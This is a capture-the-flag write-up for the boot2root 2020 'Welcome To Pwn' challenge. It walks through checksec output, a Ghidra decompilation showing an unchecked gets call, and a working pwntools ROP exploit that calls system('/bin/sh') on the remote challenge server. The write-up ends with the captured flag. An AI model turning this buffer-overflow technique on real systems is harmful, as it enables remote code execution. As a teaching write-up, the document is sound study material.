# boot2root 2020

## Welcome To Pwn

> 457
>
> Welcome to pwn, here is an easy challenge to get you started.
>
> `nc 35.238.225.156 1001`
>
> Author: Viper_S
> 
> [welcome](welcome)

Tags: _pwn_ _x86-64_ _remote-shell_ _bof_ _rop_


## Summary

Basic ROP binary with freebies included.
 

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE or Canary; easy ROP.


### Decompile with Ghidra

```c
undefined8 main(void)
{
  char local_98 [140];
  __gid_t local_c;
  
  setvbuf(stdout,(char *)0x0,2,0);
  local_c = getegid();
  setresgid(local_c,local_c,local_c);
  puts("----WELCOME TO PWN----");
  printf("Let\'s see what u got ");
  gets(local_98);
  puts("Damn that\'s it?");
  return 0;
}
```

`gets` with no stack canary provides an easy buffer overflow.

Normally I'd use `puts` to _put_ itself out there (i.e. leak its address using the GOT), then use that to find the version and address of libc so that I could then find both `system` and `/bin/sh` in libc, but that is not necessary here:

```bash
# strings welcome | grep /bin/sh
/bin/sh
```

If `/bin/sh` is in there, perhaps `system` is in the GOT:

```bash
# objdump -M intel -d welcome | grep system
0000000000401050 <system@plt>:
  401192:	e8 b9 fe ff ff       	call   401050 <system@plt>
```

Yep, so all we need to do is write out `0x98` bytes of junk (`local_98` is `0x98` bytes from the return address), then call `system` with the location of `/bin/sh`.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./welcome')

if args.REMOTE:
    p = remote('35.238.225.156', 1001)
else:
    p = process(binary.path)

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = b''
payload += 0x98 * b'A'
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(binary.search(b'/bin/sh').__next__())
payload += p64(binary.plt.system)

p.sendlineafter('what u got ',payload)
p.interactive()
```

`pop_rdi+1` is the same as `ret` and is used to align the stack, otherwise `system` would segfault (see [blind-piloting](https://github.com/datajerk/ctf-write-ups/tree/master/b01lersctf2020/blind-piloting) and search for stack-alignment).  The next instruction will pop the address of `/bin/sh` into `rdi` (required for `system`). Lastly, `system` is called.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/boot2root2020/welcome_to_pwn/welcome'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 35.238.225.156 on port 1001: Done
[*] Loaded 14 cached gadgets for './welcome'
[*] Switching to interactive mode
Damn that's it?
$ cat flag
b00t2root{W3lc0m3_T0_Pwn_YjAwdDJyb290JzIw}
```
